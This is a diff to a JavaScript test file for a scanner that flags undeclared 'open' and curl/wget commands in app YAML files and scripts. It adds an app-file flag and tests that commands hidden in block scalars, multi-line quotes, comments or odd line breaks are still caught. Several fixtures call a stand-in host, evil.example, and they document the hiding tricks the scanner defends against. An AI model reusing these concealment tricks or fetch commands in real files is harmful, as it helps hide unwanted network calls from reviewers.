@@ -51,31 +51,32 @@ test('lint (gallery app) and verify (its pack) both warn and exit 0', () => {
 	assert.ok(JSON.parse(v.stdout).findings.some((x) => x.code === 'pipe_step_not_supported' && x.level === 'warning'), v.stdout);
 });
 
-const f = (name, text) => [{ name, text }];
+const f = (name, text) => [{ name, text }];            // a file the scan treats as a script
+const fa = (name, text) => [{ name, text, app: true }]; // an app file (utilities/*.yaml): the only kind whose description text is skipped
 const OPEN = 'open (starts other programs or documents) (in ';
 const CURL = 'curl or wget to evil.example, which it does not declare (in ';
 test('scan: one-line description text does not trigger open or curl, a real command still does', () => {
 	// known remaining false positive: a comment line in a script or a YAML # comment is still scanned (a line filter cannot skip it safely)
 	assert.deepEqual(scanMentions(f('a.sh', '# open /var/log in your editor\n')), [`${OPEN}a.sh)`]);
 	assert.deepEqual(scanMentions(f('a.py', '  # open "/tmp/x" to see it\n')), [`${OPEN}a.py)`]);
-	assert.deepEqual(scanMentions(f('app.yaml', 'description: "Wraps curl so you can fetch pages"\n')), []);
-	assert.deepEqual(scanMentions(f('app.yaml', 'description: "open /var/log in your editor"\n')), []);
-	assert.deepEqual(scanMentions(f('app.yaml', 'placeholder_examples: ["curl it"]\ndescription: Wraps wget\n')), []);
+	assert.deepEqual(scanMentions(fa('app.yaml', 'description: "Wraps curl so you can fetch pages"\n')), []);
+	assert.deepEqual(scanMentions(fa('app.yaml', 'description: "open /var/log in your editor"\n')), []);
+	assert.deepEqual(scanMentions(fa('app.yaml', 'placeholder_examples: ["curl it"]\ndescription: Wraps wget\n')), []);
 	// true positives stay
 	assert.deepEqual(scanMentions(f('a.sh', '# note\nopen /tmp/x\n')), ['open (starts other programs or documents) (in a.sh)']);
 	assert.deepEqual(scanMentions(f('a.sh', '# note\ncurl https://api.example.com/x\n')), ['curl or wget to api.example.com, which it does not declare (in a.sh)']);
-	assert.deepEqual(scanMentions(f('app.yaml', 'bridge:\n  command:\n    macos: "curl https://api.example.com/x"\n')), ['curl or wget to api.example.com, which it does not declare (in app.yaml)']);
-	assert.deepEqual(scanMentions(f('app.yaml', 'description: Demo\ncommand: "open /tmp/x"\n')), ['open (starts other programs or documents) (in app.yaml)']);
+	assert.deepEqual(scanMentions(fa('app.yaml', 'bridge:\n  command:\n    macos: "curl https://api.example.com/x"\n')), ['curl or wget to api.example.com, which it does not declare (in app.yaml)']);
+	assert.deepEqual(scanMentions(fa('app.yaml', 'description: Demo\ncommand: "open /tmp/x"\n')), ['open (starts other programs or documents) (in app.yaml)']);
 });
 
 // Hiding a command inside something that looks like prose or a comment must not work.
 test('scan: a description line inside a block scalar or multi-line quote does not hide a command', () => {
-	assert.deepEqual(scanMentions(f('app.yaml', 'run: |\n  description: x; open /Applications/Foo.app\n')), [`${OPEN}app.yaml)`]);
-	assert.deepEqual(scanMentions(f('app.yaml', 'run: |\n  description: ; curl https://evil.example/x\n')), [`${CURL}app.yaml)`]);
-	assert.deepEqual(scanMentions(f('app.yaml', 'title: "one\ndescription: ; curl https://evil.example/x"\n')), [`${CURL}app.yaml)`]);
-	assert.deepEqual(scanMentions(f('app.yaml', 'description: |\n  open /tmp/x\n')), [`${OPEN}app.yaml)`]);
-	assert.deepEqual(scanMentions(f('app.yaml', 'description: "unclosed\n  ; open /tmp/x"\n')), [`${OPEN}app.yaml)`]);
-	assert.deepEqual(scanMentions(f('app.yaml', '  description: "indented, so not the top-level key; open /tmp/x"\n')), [`${OPEN}app.yaml)`]);
+	assert.deepEqual(scanMentions(fa('app.yaml', 'run: |\n  description: x; open /Applications/Foo.app\n')), [`${OPEN}app.yaml)`]);
+	assert.deepEqual(scanMentions(fa('app.yaml', 'run: |\n  description: ; curl https://evil.example/x\n')), [`${CURL}app.yaml)`]);
+	assert.deepEqual(scanMentions(fa('app.yaml', 'title: "one\ndescription: ; curl https://evil.example/x"\n')), [`${CURL}app.yaml)`]);
+	assert.deepEqual(scanMentions(fa('app.yaml', 'description: |\n  open /tmp/x\n')), [`${OPEN}app.yaml)`]);
+	assert.deepEqual(scanMentions(fa('app.yaml', 'description: "unclosed\n  ; open /tmp/x"\n')), [`${OPEN}app.yaml)`]);
+	assert.deepEqual(scanMentions(fa('app.yaml', '  description: "indented, so not the top-level key; open /tmp/x"\n')), [`${OPEN}app.yaml)`]);
 });
 test('scan: no comment skipping in scripts: a command after a comment marker, in a string, heredoc or continuation, is still found', () => {
 	const hit = (n, t) => assert.deepEqual(scanMentions(f(n, t)), [`${CURL}${n})`], t);
@@ -95,6 +96,15 @@ test('scan: a lone CR or U+2028 ends a line in Python and JS, so what follows is
 	assert.deepEqual(scanMentions(f('a.js', '// c\u2028exec("curl https://evil.example/x")\n')), [`${CURL}a.js)`]);
 });
 test('scan: CRLF app file keeps skipping one-line description text and still finds commands', () => {
-	assert.deepEqual(scanMentions(f('app.yaml', 'description: "Wraps curl so you can fetch pages"\r\nid: x\r\n')), []);
+	assert.deepEqual(scanMentions(fa('app.yaml', 'description: "Wraps curl so you can fetch pages"\r\nid: x\r\n')), []);
 	assert.deepEqual(scanMentions(f('a.sh', '# note\r\ncurl https://evil.example/x\r\n')), [`${CURL}a.sh)`]);
+});
+test('scan: the description skip applies to app files only, never to a script that happens to be named .yaml', () => {
+	const body = 'description: x; curl https://evil.example/x\n';
+	assert.deepEqual(scanMentions(f('demo__run.yaml', body)), [`${CURL}demo__run.yaml)`]);
+	assert.deepEqual(scanMentions(f('demo__run.yml', 'placeholder_examples: [a]; open /tmp/x\n')), [`${OPEN}demo__run.yml)`]);
+	assert.deepEqual(scanMentions([{ name: 'demo__run.yaml', text: body, app: false }]), [`${CURL}demo__run.yaml)`]);
+	// the same text in an app file is prose only when the whole value is one line of text
+	assert.deepEqual(scanMentions(fa('app.yaml', 'description: "Wraps curl so you can fetch pages"\n')), []);
+	assert.deepEqual(scanMentions(fa('app.yaml', body)), []); // in the app file it is a description string, which Bolt never runs
 });
